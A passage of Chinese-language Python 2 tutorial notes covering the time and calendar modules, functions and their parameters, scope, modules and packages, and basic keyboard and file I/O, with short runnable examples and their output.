		你可以根据需求选取各种格式，但是最简单的获取可读的时间模式的函数是asctime():
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			import time

			localtime = time.asctime( time.localtime(time.time()) )
			print "本地时间为 :", localtime

			以上实例输出结果：

			本地时间为 : Thu Apr  7 10:05:21 2016

	格式化日期
		我们可以使用 time 模块的 strftime 方法来格式化日期，：
		time.strftime(format[, t])

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		import time

		# 格式化成2016-03-20 11:45:39形式
		print time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) 

		# 格式化成Sat Mar 28 22:24:24 2016形式
		print time.strftime("%a %b %d %H:%M:%S %Y", time.localtime()) 
		  
		# 将格式字符串转换为时间戳
		a = "Sat Mar 28 22:24:24 2016"
		print time.mktime(time.strptime(a,"%a %b %d %H:%M:%S %Y"))

		以上实例输出结果：

		2016-04-07 10:25:09
		Thu Apr 07 10:25:09 2016
		1459175064.0

	python中时间日期格式化符号：

		%y 两位数的年份表示（00-99）
		%Y 四位数的年份表示（000-9999）
		%m 月份（01-12）
		%d 月内中的一天（0-31）
		%H 24小时制小时数（0-23）
		%I 12小时制小时数（01-12）
		%M 分钟数（00=59）
		%S 秒（00-59）
		%a 本地简化星期名称
		%A 本地完整星期名称
		%b 本地简化的月份名称
		%B 本地完整的月份名称
		%c 本地相应的日期表示和时间表示
		%j 年内的一天（001-366）
		%p 本地A.M.或P.M.的等价符
		%U 一年中的星期数（00-53）星期天为星期的开始
		%w 星期（0-6），星期天为星期的开始
		%W 一年中的星期数（00-53）星期一为星期的开始
		%x 本地相应的日期表示
		%X 本地相应的时间表示
		%Z 当前时区的名称
		%% %号本身

	获取某月日历
		Calendar模块有很广泛的方法用来处理年历和月历，例如打印某月的月历：

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-

		import calendar

		cal = calendar.month(2016, 1)
		print "以下输出2016年1月份的日历:"
		print cal;

		以上实例输出结果：

		以下输出2016年1月份的日历:
			January 2016
		Mo Tu We Th Fr Sa Su
					 1  2  3
		 4  5  6  7  8  9 10
		11 12 13 14 15 16 17
		18 19 20 21 22 23 24
		25 26 27 28 29 30 31


	Time 模块
		Time 模块包含了以下内置函数，既有时间处理相的，也有转换时间格式的：
			序号	函数及描述
			1		time.altzone
					返回格林威治西部的夏令时地区的偏移秒数。如果该地区在格林威治东部会返回负值（如西欧，包括英国）。对夏令时启用地区才能使用。
			2		time.asctime([tupletime])
					接受时间元组并返回一个可读的形式为"Tue Dec 11 18:07:14 2008"（2008年12月11日 周二18时07分14秒）的24个字符的字符串。
			3		time.clock( )
					用以浮点数计算的秒数返回当前的CPU时间。用来衡量不同程序的耗时，比time.time()更有用。
			4		time.ctime([secs])
					作用相当于asctime(localtime(secs))，未给参数相当于asctime()
			5		time.gmtime([secs])
					接收时间辍（1970纪元后经过的浮点秒数）并返回格林威治天文时间下的时间元组t。注：t.tm_isdst始终为0
			6		time.localtime([secs])
					接收时间辍（1970纪元后经过的浮点秒数）并返回当地时间下的时间元组t（t.tm_isdst可取0或1，取决于当地当时是不是夏令时）。
			7		time.mktime(tupletime)
					接受时间元组并返回时间辍（1970纪元后经过的浮点秒数）。
			8		time.sleep(secs)
					推迟调用线程的运行，secs指秒数。
			9		time.strftime(fmt[,tupletime])
					接收以时间元组，并返回以可读字符串表示的当地时间，格式由fmt决定。
			10		time.strptime(str,fmt='%a %b %d %H:%M:%S %Y')
					根据fmt的格式把一个时间字符串解析为时间元组。
			11		time.time( )
					返回当前时间的时间戳（1970纪元后经过的浮点秒数）。
			12		time.tzset()
					根据环境变量TZ重新初始化时间相关设置。

		Time模块包含了以下2个非常重要的属性：
			序号	属性及描述
			1		time.timezone
					属性time.timezone是当地时区（未启动夏令时）距离格林威治的偏移秒数（>0，美洲;<=0大部分欧洲，亚洲，非洲）。
			2		time.tzname
					属性time.tzname包含一对根据情况的不同而不同的字符串，分别是带夏令时的本地时区名称，和不带的。

		日历（Calendar）模块
			此模块的函数都是日历相关的，例如打印某月的字符月历。
			星期一是默认的每周第一天，星期天是默认的最后一天。更改设置需调用calendar.setfirstweekday()函数。模块包含了以下内置函数：
			序号	函数及描述
			1		calendar.calendar(year,w=2,l=1,c=6)
					返回一个多行字符串格式的year年年历，3个月一行，间隔距离为c。 每日宽度间隔为w字符。每行长度为21* W+18+2* C。l是每星期行数。
			2		calendar.firstweekday( )
					返回当前每周起始日期的设置。默认情况下，首次载入caendar模块时返回0，即星期一。
			3		calendar.isleap(year)
					是闰年返回True，否则为false。
			4		calendar.leapdays(y1,y2)
					返回在Y1，Y2两年之间的闰年总数。
			5		calendar.month(year,month,w=2,l=1)
					返回一个多行字符串格式的year年month月日历，两行标题，一周一行。每日宽度间隔为w字符。每行的长度为7* w+6。l是每星期的行数。
			6		calendar.monthcalendar(year,month)
					返回一个整数的单层嵌套列表。每个子列表装载代表一个星期的整数。Year年month月外的日期都设为0;范围内的日子都由该月第几日表示，从1开始。
			7		calendar.monthrange(year,month)
					返回两个整数。第一个是该月的星期几的日期码，第二个是该月的日期码。日从0（星期一）到6（星期日）;月从1到12。
			8		calendar.prcal(year,w=2,l=1,c=6)
					相当于 print calendar.calendar(year,w,l,c).
			9		calendar.prmonth(year,month,w=2,l=1)
					相当于 print calendar.calendar（year，w，l，c）。
			10		calendar.setfirstweekday(weekday)
					设置每周的起始日期码。0（星期一）到6（星期日）。
			11		calendar.timegm(tupletime)
					和time.gmtime相反：接受一个时间元组形式，返回该时刻的时间辍（1970纪元后经过的浮点秒数）。
			12		calendar.weekday(year,month,day)
					返回给定日期的日期码。0（星期一）到6（星期日）。月份为 1（一月） 到 12（12月）。

			其他相关模块和函数
			在Python中，其他处理日期和时间的模块还有：

				datetime模块	https://docs.python.org/3/library/datetime.html#module-datetime
				pytz模块		http://www.twinsun.com/tz/tz-link.htm
				dateutil模块    http://labix.org/python-dateutil

			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			import datetime
			i = datetime.datetime.now()
			print ("当前的日期和时间是 %s" % i)
			print ("ISO格式的日期和时间是 %s" % i.isoformat() )
			print ("当前的年份是 %s" %i.year)
			print ("当前的月份是 %s" %i.month)
			print ("当前的日期是  %s" %i.day)
			print ("dd/mm/yyyy 格式是  %s/%s/%s" % (i.day, i.month, i.year) )
			print ("当前小时是 %s" %i.hour)
			print ("当前分钟是 %s" %i.minute)
			print ("当前秒是  %s" %i.second)
			


Python 函数
函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。
函数能提高应用的模块性，和代码的重复利用率。你已经知道Python提供了许多内建函数，比如print()。但你也可以自己创建函数，这被叫做用户自定义函数。

	定义一个函数
		你可以定义一个由自己想要功能的函数，以下是简单的规则：
			函数代码块以 def 关键词开头，后接函数标识符名称和圆括号()。
			任何传入参数和自变量必须放在圆括号中间。圆括号之间可以用于定义参数。
			函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。
			函数内容以冒号起始，并且缩进。
			return [表达式] 结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。

	语法
		def functionname( parameters ):
		   "函数_文档字符串"
		   function_suite
		   return [expression]
		默认情况下，参数值和参数名称是按函数声明中定义的的顺序匹配起来的。
>>>>>>> fe13186b9d1550946bef8bd1567ed5e7d08efe5c
	
	实例
		以下为一个简单的Python函数，它将一个字符串作为传入参数，再打印到标准显示设备上。
		def printme( str ):
		   "打印传入的字符串到标准显示设备上"
		   print str
		   return

	函数调用
		定义一个函数只给了函数一个名称，指定了函数里包含的参数，和代码块结构。
		这个函数的基本结构完成以后，你可以通过另一个函数调用执行，也可以直接从Python提示符执行。
		如下实例调用了printme（）函数：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 定义函数
			def printme( str ):
			   "打印任何传入的字符串"
			   print str;
			   return;
			 
			# 调用函数
			printme("我要调用用户自定义函数!");
			printme("再次调用同一函数");

			以上实例输出结果：

			我要调用用户自定义函数!
			再次调用同一函数

	参数传递
		在 python 中，类型属于对象，变量是没有类型的：
			a=[1,2,3]
			a="Runoob"
		以上代码中，[1,2,3] 是 List 类型，"Runoob" 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是 List 类型对象，也可以指向 String 类型对象。
		可更改(mutable)与不可更改(immutable)对象
		在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。
			不可变类型：变量赋值 a=5 后再赋值 a=10，这里实际是新生成一个 int 值对象 10，再让 a 指向它，而 5 被丢弃，不是改变a的值，相当于新生成了a。
			可变类型：变量赋值 la=[1,2,3,4] 后再赋值 la[2]=5 则是将 list la 的第三个元素值更改，本身la没有动，只是其内部的一部分值被修改了。

	python 函数的参数传递：
		不可变类型：类似 c++ 的值传递，如 整数、字符串、元组。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。
		可变类型：类似 c++ 的引用传递，如 列表，字典。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响

	python 中一切都是对象，严格意义我们不能说值传递还是引用传递，我们应该说传不可变对象和传可变对象。
		python 传不可变对象实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			def ChangeInt( a ):
				a = 10

			b = 2
			ChangeInt(b)
			print b # 结果是 2

			实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它。
			
		传可变对象实例
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 可写函数说明
			def changeme( mylist ):
			   "修改传入的列表"
			   mylist.append([1,2,3,4]);
			   print "函数内取值: ", mylist
			   return
			 
			# 调用changeme函数
			mylist = [10,20,30];
			changeme( mylist );
			print "函数外取值: ", mylist

			实例中传入函数的和在末尾添加新内容的对象用的是同一个引用，故输出结果如下：

			函数内取值:  [10, 20, 30, [1, 2, 3, 4]]
			函数外取值:  [10, 20, 30, [1, 2, 3, 4]]

	参数
		以下是调用函数时可使用的正式参数类型：
			必备参数
			关键字参数
			默认参数
			不定长参数

	必备参数
		必备参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。

		调用printme()函数，你必须传入一个参数，不然会出现语法错误：

		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		#可写函数说明
		def printme( str ):
		   "打印任何传入的字符串"
		   print str;
		   return;
		 
		#调用printme函数
		printme();

		以上实例输出结果：

		Traceback (most recent call last):
		  File "test.py", line 11, in <module>
			printme();
		TypeError: printme() takes exactly 1 argument (0 given)

	关键字参数
		关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。
		使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。

		以下实例在函数 printme() 调用时使用参数名：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			#可写函数说明
			def printme( str ):
			   "打印任何传入的字符串"
			   print str;
			   return;
			 
			#调用printme函数
			printme( str = "My string");

		以上实例输出结果：
			My string

		下例能将关键字参数顺序不重要展示得更清楚：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		#可写函数说明
		def printinfo( name, age ):
		   "打印任何传入的字符串"
		   print "Name: ", name;
		   print "Age ", age;
		   return;
		 
		#调用printinfo函数
		printinfo( age=50, name="miki" );

		以上实例输出结果：

		Name:  miki
		Age  50

	缺省参数
		调用函数时，缺省参数的值如果没有传入，则被认为是默认值。下例会打印默认的age，如果age没有被传入：
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		#可写函数说明
		def printinfo( name, age = 35 ):
		   "打印任何传入的字符串"
		   print "Name: ", name;
		   print "Age ", age;
		   return;
		 
		#调用printinfo函数
		printinfo( age=50, name="miki" );
		printinfo( name="miki" );

		以上实例输出结果：
		Name:  miki
		Age  50
		Name:  miki
		Age  35

	不定长参数
		你可能需要一个函数能处理比当初声明时更多的参数。这些参数叫做不定长参数，和上述2种参数不同，声明时不会命名。基本语法如下：

		def functionname([formal_args,] *var_args_tuple ):
		   "函数_文档字符串"
		   function_suite
		   return [expression]

		加了星号（*）的变量名会存放所有未命名的变量参数。选择不多传参数也可。如下实例：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 可写函数说明
			def printinfo( arg1, *vartuple ):
			   "打印任何传入的参数"
			   print "输出: "
			   print arg1
			   for var in vartuple:
				  print var
			   return;
			 
			# 调用printinfo 函数
			printinfo( 10 );
			printinfo( 70, 60, 50 );

			以上实例输出结果：

			输出:
			10
			输出:
			70
			60
			50

	匿名函数
		python 使用 lambda 来创建匿名函数。
		lambda只是一个表达式，函数体比def简单很多。
		lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。
		lambda函数拥有自己的命名空间，且不能访问自有参数列表之外或全局命名空间里的参数。
		虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。

		语法
			lambda函数的语法只包含一个语句，如下：
			lambda [arg1 [,arg2,.....argn]]:expression

			如下实例：
				#!/usr/bin/python
				# -*- coding: UTF-8 -*-
				 
				# 可写函数说明
				sum = lambda arg1, arg2: arg1 + arg2;
				 
				# 调用sum函数
				print "相加后的值为 : ", sum( 10, 20 )
				print "相加后的值为 : ", sum( 20, 20 )
			以上实例输出结果：
				相加后的值为 :  30
				相加后的值为 :  40

		return 语句
			return语句[表达式]退出函数，选择性地向调用方返回一个表达式。不带参数值的return语句返回None。之前的例子都没有示范如何返回数值，下例便告诉你怎么做：

			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 可写函数说明
			def sum( arg1, arg2 ):
			   # 返回2个参数的和."
			   total = arg1 + arg2
			   print "函数内 : ", total
			   return total;
			 
			# 调用sum函数
			total = sum( 10, 20 );

			以上实例输出结果：

			函数内 :  30

		变量作用域
			一个程序的所有的变量并不是在哪个位置都可以访问的。访问权限决定于这个变量是在哪里赋值的。
			变量的作用域决定了在哪一部分程序你可以访问哪个特定的变量名称。两种最基本的变量作用域如下：

				全局变量
				局部变量

			全局变量和局部变量

			定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。

			局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：

			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			total = 0; # 这是一个全局变量
			# 可写函数说明
			def sum( arg1, arg2 ):
			   #返回2个参数的和."
			   total = arg1 + arg2; # total在这里是局部变量.
			   print "函数内是局部变量 : ", total
			   return total;
			 
			#调用sum函数
			sum( 10, 20 );
			print "函数外是全局变量 : ", total 

			以上实例输出结果：

			函数内是局部变量 :  30
			函数外是全局变量 :  0

	笔记列表
		1.全局变量想作用于函数内，需加 global
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-

			globvar = 0

			def set_globvar_to_one():
				global globvar    # 使用 global 声明全局变量
				globvar = 1

			def print_globvar():
				print(globvar)     # 没有使用 global

			set_globvar_to_one()
			print  globvar        # 输出 1
			print_globvar()       # 输出 1，函数内的 globvar 已经是全局变量

			1、global---将变量定义为全局变量。可以通过定义为全局变量，实现在函数内部改变变量值。

			2、一个global语句可以同时定义多个变量，如 global x, y, z。


		2.列表反转函数:
			#!/user/bin/python
			# -*- coding: UTF-8 -*-

			def reverse(li):
				for i in range(0, len(li)/2):
					temp = li[i]
					li[i] = li[-i-1]
					li[-i-1] = temp

			l = [1, 2, 3, 4, 5]
			reverse(l)
			print(l)


		3.列表反转函数二:
			def reverse(ListInput):
				RevList=[]
				for i in range (len(ListInput)):
					RevList.append(ListInput.pop())
				return RevList

		4.简化列表反转：
			def reverse(li):
				for i in range(0, len(li)/2):
					li[i], li[-i - 1] = li[-i - 1], li[i]
			l = [1, 2, 3, 4, 5]
			reverse(l)
			print(l)

		5.参考地址
			关于 return fun 和 return fun() 的区别：
				>>> def funx(x):
						def funy(y):
							return x * y
						return funy    #return funy返回的是一个对象，可理解为funx是funy的一个对象
				>>> funx(7)(8)
				56
				
				>>> def funx(x):
						def funy(y):
							return x*y
						return funy()    #return funy()返回的是funy的函数返回值，所以此处报错
				>>> funx(7)(8)
				Traceback (most recent call last):
				  File "<pyshell#5>", line 1, in <module>
					funx(7)(8)
				  File "<pyshell#4>", line 4, in funx
					return funy()
				TypeError: funy() takes exactly 1 argument (0 given)

				>>> def funx(x):
					def funy(y):
						return x * y
					return funy(8)    
				>>> funx(7)
				56


Python 模块
	Python 模块(Module)，是一个 Python 文件，以 .py 结尾，包含了 Python 对象定义和Python语句。
	模块让你能够有逻辑地组织你的 Python 代码段。
	把相关的代码分配到一个模块里能让你的代码更好用，更易懂。
	模块能定义函数，类和变量，模块里也能包含可执行的代码。

	例子
		下例是个简单的模块 support.py：
		support.py 模块：
		def print_func( par ):
		   print "Hello : ", par
		   return
	
	import 语句：模块的引入
		模块定义好后，我们可以使用 import 语句来引入模块，语法如下：
			import module1[, module2[,... moduleN]
		比如要引用模块 math，就可以在文件最开始的地方用 import math 来引入。
		
		在调用 math 模块中的函数时，必须这样引用：
			模块名.函数名

		当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。

		搜索路径是一个解释器会先进行搜索的所有目录的列表。
		如想要导入模块 support.py，需要把命令放在脚本的顶端：
			test.py 文件代码：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 导入模块
			import support
			 
			# 现在可以调用模块里包含的函数了
			support.print_func("Runoob")

			以上实例输出结果：
			Hello : Runoob

		一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。

		From…import 语句
			Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中。
			语法如下：
				from modname import name1[, name2[, ... nameN]]
			例如，要导入模块 fib 的 fibonacci 函数，使用如下语句：
				from fib import fibonacci
			这个声明不会把整个 fib 模块导入到当前的命名空间中，它只会将 fib 里的 fibonacci 单个引入到执行这个声明的模块的全局符号表。

		From…import* 语句
			把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：
				from modname import *
			这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。
			例如我们想一次性引入 math 模块中所有的东西，语句如下：
				from math import *

	搜索路径
		当你导入一个模块，Python 解析器对模块位置的搜索顺序是：
			1、当前目录
			2、如果不在当前目录，Python 则搜索在 shell 变量 PYTHONPATH 下的每个目录。
			3、如果都找不到，Python会察看默认路径。UNIX下，默认路径一般为/usr/local/lib/python/。

		模块搜索路径存储在 system 模块的 sys.path 变量中。变量里包含当前目录，PYTHONPATH和由安装过程决定的默认目录。

	PYTHONPATH 变量
		作为环境变量，PYTHONPATH 由装在一个列表里的许多目录组成。PYTHONPATH 的语法和 shell 变量 PATH 的一样。
    

	命名空间和作用域
	
		变量是拥有匹配对象的名字（标识符）。命名空间是一个包含了变量名称们（键）和它们各自相应的对象们（值）的字典。
		
		一个 Python 表达式可以访问局部命名空间和全局命名空间里的变量。
		
		如果一个局部变量和一个全局变量重名，则局部变量会覆盖全局变量。
		
		每个函数都有自己的命名空间。类的方法的作用域规则和通常函数的一样。
		
		Python 会智能地猜测一个变量是局部的还是全局的，它假设任何在函数内赋值的变量都是局部的。因此，如果要给函数内的全局变量赋值，必须使用 global 语句。
		
		global VarName 的表达式会告诉 Python， VarName 是一个全局变量，这样 Python 就不会在局部命名空间里寻找这个变量了。
		
		例如，我们在全局命名空间里定义一个变量 Money。我们再在函数内给变量 Money 赋值，然后 Python 会假定 Money 是一个局部变量。然而，我们并没有在访问前声明一个局部变量 Money，结果就是会出现一个 UnboundLocalError 的错误。取消 global 语句的注释就能解决这个问题。
		
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			Money = 2000
			def AddMoney():
			   # 想改正代码就取消以下注释:
			   # global Money
			   Money = Money + 1
			 
			print Money
			AddMoney()
			print Money


	dir()函数

		dir() 函数一个排好序的字符串列表，内容是一个模块里定义过的名字。

		返回的列表容纳了在一个模块里定义的所有模块，变量和函数。如下一个简单的实例：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 导入内置math模块
			import math
			 
			content = dir(math)
			 
			print content;

			以上实例输出结果：

			['__doc__', '__file__', '__name__', 'acos', 'asin', 'atan', 
			'atan2', 'ceil', 'cos', 'cosh', 'degrees', 'e', 'exp', 
			'fabs', 'floor', 'fmod', 'frexp', 'hypot', 'ldexp', 'log',
			'log10', 'modf', 'pi', 'pow', 'radians', 'sin', 'sinh', 
			'sqrt', 'tan', 'tanh']

		在这里，特殊字符串变量__name__指向模块的名字，__file__指向该模块的导入文件名。

	globals() 和 locals() 函数

		根据调用地方的不同，globals() 和 locals() 函数可被用来返回全局和局部命名空间里的名字。

		如果在函数内部调用 locals()，返回的是所有能在该函数里访问的命名。

		如果在函数内部调用 globals()，返回的是所有在该函数里能访问的全局名字。

		两个函数的返回类型都是字典。所以名字们能用 keys() 函数摘取。

	reload() 函数

		当一个模块被导入到一个脚本，模块顶层部分的代码只会被执行一次。

		因此，如果你想重新执行模块里顶层部分的代码，可以用 reload() 函数。该函数会重新导入之前导入过的模块。语法如下：

		reload(module_name)

		在这里，module_name要直接放模块的名字，而不是一个字符串形式。比如想重载 hello 模块，如下：

		reload(hello)


	Python中的包

	包是一个分层次的文件目录结构，它定义了一个由模块及子包，和子包下的子包等组成的 Python 的应用环境。

	简单来说，包就是文件夹，但该文件夹下必须存在 __init__.py 文件, 该文件的内容可以为空。__int__.py用于标识当前文件夹是一个包。

	考虑一个在 package_runoob 目录下的 runoob1.py、runoob2.py、__init__.py 文件，test.py 为测试调用包的代码，目录结构如下：
		test.py
		package_runoob
		|-- __init__.py
		|-- runoob1.py
		|-- runoob2.py

	源代码如下：
		package_runoob/runoob1.py
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		def runoob1():
		   print "I'm in runoob1"
		
		package_runoob/runoob2.py
		#!/usr/bin/python
		# -*- coding: UTF-8 -*-
		 
		def runoob2():
		   print "I'm in runoob2"

		现在，在 package_runoob 目录下创建 __init__.py：
			package_runoob/__init__.py
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			if __name__ == '__main__':
				print '作为主程序运行'
			else:
				print 'package_runoob 初始化'

		然后我们在 package_runoob 同级目录下创建 test.py 来调用 package_runoob 包
			test.py
			#!/usr/bin/python
			# -*- coding: UTF-8 -*-
			 
			# 导入 Phone 包
			from package_runoob.runoob1 import runoob1
			from package_runoob.runoob2 import runoob2
			 
			runoob1()
			runoob2()

			以上实例输出结果：

			package_runoob 初始化
			I'm in runoob1
			I'm in runoob2

	如上，为了举例，我们只在每个文件里放置了一个函数，但其实你可以放置许多函数。你也可以在这些文件里定义Python的类，然后为这些类建一个包。

	笔记列表

		   airmin

		  lau***ceair@gmail.com

		系统相关的信息模块: import sys

		sys.argv 是一个 list,包含所有的命令行参数.    
		sys.stdout sys.stdin sys.stderr 分别表示标准输入输出,错误输出的文件对象.    
		sys.stdin.readline() 从标准输入读一行 sys.stdout.write("a") 屏幕输出a    
		sys.exit(exit_code) 退出程序    
		sys.modules 是一个dictionary，表示系统中所有可用的module    
		sys.platform 得到运行的操作系统环境    
		sys.path 是一个list,指明所有查找module，package的路径.  

		操作系统相关的调用和操作: import os

		os.environ 一个dictionary 包含环境变量的映射关系   
		os.environ["HOME"] 可以得到环境变量HOME的值     
		os.chdir(dir) 改变当前目录 os.chdir('d:\\outlook')   
		注意windows下用到转义     
		os.getcwd() 得到当前目录     
		os.getegid() 得到有效组id os.getgid() 得到组id     
		os.getuid() 得到用户id os.geteuid() 得到有效用户id     
		os.setegid os.setegid() os.seteuid() os.setuid()     
		os.getgruops() 得到用户组名称列表     
		os.getlogin() 得到用户登录名称     
		os.getenv 得到环境变量     
		os.putenv 设置环境变量     
		os.umask 设置umask     
		os.system(cmd) 利用系统调用，运行cmd命令   

		内置模块(不用import就可以直接使用)常用内置函数：

		help(obj) 在线帮助, obj可是任何类型    
		callable(obj) 查看一个obj是不是可以像函数一样调用    
		repr(obj) 得到obj的表示字符串，可以利用这个字符串eval重建该对象的一个拷贝    
		eval_r(str) 表示合法的python表达式，返回这个表达式    
		dir(obj) 查看obj的name space中可见的name    
		hasattr(obj,name) 查看一个obj的name space中是否有name    
		getattr(obj,name) 得到一个obj的name space中的一个name    
		setattr(obj,name,value) 为一个obj的name   
		space中的一个name指向vale这个object    
		delattr(obj,name) 从obj的name space中删除一个name    
		vars(obj) 返回一个object的name space。用dictionary表示    
		locals() 返回一个局部name space,用dictionary表示    
		globals() 返回一个全局name space,用dictionary表示    
		type(obj) 查看一个obj的类型    
		isinstance(obj,cls) 查看obj是不是cls的instance    
		issubclass(subcls,supcls) 查看subcls是不是supcls的子类  

		##################    类型转换  ##################

		chr(i) 把一个ASCII数值,变成字符    
		ord(i) 把一个字符或者unicode字符,变成ASCII数值    
		oct(x) 把整数x变成八进制表示的字符串    
		hex(x) 把整数x变成十六进制表示的字符串    
		str(obj) 得到obj的字符串描述    
		list(seq) 把一个sequence转换成一个list    
		tuple(seq) 把一个sequence转换成一个tuple    
		dict(),dict(list) 转换成一个dictionary    
		int(x) 转换成一个integer    
		long(x) 转换成一个long interger    
		float(x) 转换成一个浮点数    
		complex(x) 转换成复数    
		max(...) 求最大值    
		min(...) 求最小值  

		

Python 文件I/O

	本章只讲述所有基本的的I/O函数，更多函数请参考Python标准文档。
	打印到屏幕
		最简单的输出方法是用print语句，你可以给它传递零个或多个用逗号隔开的表达式。此函数把你传递的表达式转换成一个字符串表达式，并将结果写到标准输出如下：
			#!/usr/bin/python
			# -*- coding: UTF-8 -*- 

			print "Python 是一个非常棒的语言，不是吗？";

			你的标准屏幕上会产生以下结果：

			Python 是一个非常棒的语言，不是吗？

	读取键盘输入
		Python提供了两个内置函数从标准输入读入一行文本，默认的标准输入是键盘。如下：

			raw_input
			input

		raw_input函数
			raw_input([prompt]) 函数从标准输入读取一个行，并返回一个字符串（去掉结尾的换行符）：

			#!/usr/bin/python
			# -*- coding: UTF-8 -*- 
			 
			str = raw_input("请输入：");
			print "你输入的内容是: ", str

			这将提示你输入任意字符串，然后在屏幕上显示相同的字符串。当我输入"Hello Python！"，它的输出如下：

			请输入：Hello Python！
			你输入的内容是:  Hello Python！

		input函数
			input([prompt]) 函数和 raw_input([prompt]) 函数基本类似，但是 input 可以接收一个Python表达式作为输入，并将运算结果返回。

			#!/usr/bin/python
			# -*- coding: UTF-8 -*- 
			 
			str = input("请输入：");
			print "你输入的内容是: ", str

			这会产生如下的对应着输入的结果：

			请输入：[x*5 for x in range(2,10,2)]
			你输入的内容是:  [10, 20, 30, 40]
			#python中的生成器，生成一个列表。从表达式可以看出是生成5*x，x是2-10范围内，以2为步长的元素。那就是2 4 6 8，所以生成了[10， 20， 30， 40]

			
	打开和关闭文件
		Python 提供了必要的函数和方法进行默认情况下的文件基本操作。你可以用 file 对象做大部分的文件操作。
		open 函数
			你必须先用Python内置的open()函数打开一个文件，创建一个file对象，相关的方法才可以调用它进行读写。

			语法：
				file object = open(file_name [, access_mode][, buffering])

			各个参数的细节如下：
				file_name：file_name变量是一个包含了你要访问的文件名称的字符串值。
				access_mode：access_mode决定了打开文件的模式：只读，写入，追加等。所有可取值见如下的完全列表。这个参数是非强制的，默认文件访问模式为只读(r)。
				buffering:如果buffering的值被设为0，就不会有寄存。如果buffering的值取1，访问文件时会寄存行。如果将buffering的值设为大于1的整数，表明了这就是的寄存区的缓冲大小。如果取负值，寄存区的缓冲大小则为系统默认。

			不同模式打开文件的完全列表：
				模式	描述
				r	以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。
				rb	以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。
				r+	打开一个文件用于读写。文件指针将会放在文件的开头。
				rb+	以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。
				w	打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
				wb	以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
				w+	打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
				wb+	以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
				a	打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。
				ab	以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。
				a+	打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。
				ab+	以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。
			
			File对象的属性
				一个文件被打开后，你有一个file对象，你可以得到有关该文件的各种信息。

				以下是和file对象相关的所有属性的列表：
				属性					描述
				file.closed		返回true如果文件已被关闭，否则返回false。
				file.mode		返回被打开文件的访问模式。
				file.name		返回文件的名称。
				file.softspace	如果用print输出后，必须跟一个空格符，则返回false。否则返回true。

			如下实例：
				#!/usr/bin/python
				# -*- coding: UTF-8 -*-
				 
				# 打开一个文件
				fo = open("foo.txt", "wb")
				print "文件名: ", fo.name
				print "是否已关闭 : ", fo.closed
				print "访问模式 : ", fo.mode
				print "末尾是否强制加空格 : ", fo.softspace

				以上实例输出结果：

				文件名:  foo.txt
				是否已关闭 :  False
				访问模式 :  wb
				末尾是否强制加空格 :  0

		close()方法
